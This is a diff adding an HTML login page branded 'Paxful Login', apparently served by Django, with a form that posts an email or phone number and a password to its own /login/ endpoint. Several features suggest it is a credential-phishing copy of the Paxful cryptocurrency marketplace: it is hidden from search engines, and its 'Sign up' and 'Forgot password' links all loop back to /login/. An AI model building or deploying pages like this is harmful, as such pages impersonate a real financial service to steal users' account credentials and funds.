@@ -1,0 +1,118 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paxful Login</title>
+    <link rel="stylesheet" href="/static/css/styles.css">
+    <link rel="stylesheet" href="/static/css/fa.css">
+  </head>
+
+  <body>
+    <div class="log_flex">
+      <div class="log_flex_one">
+        <div class="logo_one">
+          <div class="img">
+            <img src="/static/img/logo.png" alt="Logo">
+          </div>
+        </div>
+        <h5>Welcome back!</h5>
+        <div class="se_l_flex">
+          <p class="p_l_f_o">
+            Don't have an account?
+          </p>
+          <a href="/login/" class="p_l_s_o">Sign up</a>
+        </div>
+
+        <!-- Error Message (Django Server-Side) -->
+        
+        <div id="error" class="error" style="display: none;">
+          <i class="fa-regular fa-circle-xmark"></i> <span id="errorMsg"></span>
+        </div>
+        
+
+        <!-- Login Form -->
+        <form id="loginForm" method="POST" action="/login/">
+          
+          <input type="hidden" name="csrfmiddlewaretoken" value="7LjWtyezHeqswXz4iwGeLBpCGbc4Ph1ZbZNjRLTGt3TZhFQq9DLnUOkjoHDUkNmP">
+          <div class="imput_cont">
+            <h4>Email / Phone Number</h4>
+            <div class="input">
+              <input type="text" name="email_or_phone" id="email" placeholder="Email/Phone Number" required="">
+            </div>
+          </div>
+          <div class="imput_cont">
+            <h4>Password</h4>
+            <div class="input">
+              <input id="password" type="password" name="password" placeholder="Password" required="">
+            </div>
+            <div class="eye">
+              <i id="eyeIcon" class="fa-regular fa-eye"></i>
+            </div>
+          </div>
+          <div class="forgot">
+            <a href="/login/">Forgot password</a>
+          </div>
+          <button type="submit" class="log_btn">Sign in</button>
+        </form>
+      </div>
+
+      <div class="log_flex_two">
+        <div class="log_flex_two_bg_relative">
+          <div class="log_fle_two_log_bg">
+            <div class="img">
+              <img src="/static/img/rightlogo.png" alt="Right Logo">
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="/static/js/jquery.js"></script>
+    <script>
+      // Toggle password visibility
+      document.getElementById('eyeIcon').addEventListener('click', function () {
+        const passwordInput = document.getElementById('password');
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          this.classList.remove('fa-eye');
+          this.classList.add('fa-eye-slash');
+        } else {
+          passwordInput.type = 'password';
+          this.classList.remove('fa-eye-slash');
+          this.classList.add('fa-eye');
+        }
+      });
+    </script>
+
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', function (event) {
+        const emailInput = document.getElementById('email');
+        const errorDiv = document.getElementById('error');
+        const errorMsg = document.getElementById('errorMsg');
+    
+        // Regular Expression for Email Validation
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    
+        if (!emailPattern.test(emailInput.value)) {
+          event.preventDefault(); // Stop form submission
+          errorMsg.textContent = 'Please enter a valid email address.';
+          errorDiv.style.display = 'block';
+        } else {
+          errorDiv.style.display = 'none'; // Hide error if valid
+        }
+      });
+
+      // Show server-side error message if exists
+      document.addEventListener("DOMContentLoaded", function () {
+        const errorDiv = document.getElementById('error');
+        if (errorDiv.textContent.trim() !== "") {
+          errorDiv.style.display = 'block'; // Show error if Django provided one
+        }
+      });
+    </script>
+    
+  
+
+</body></html>
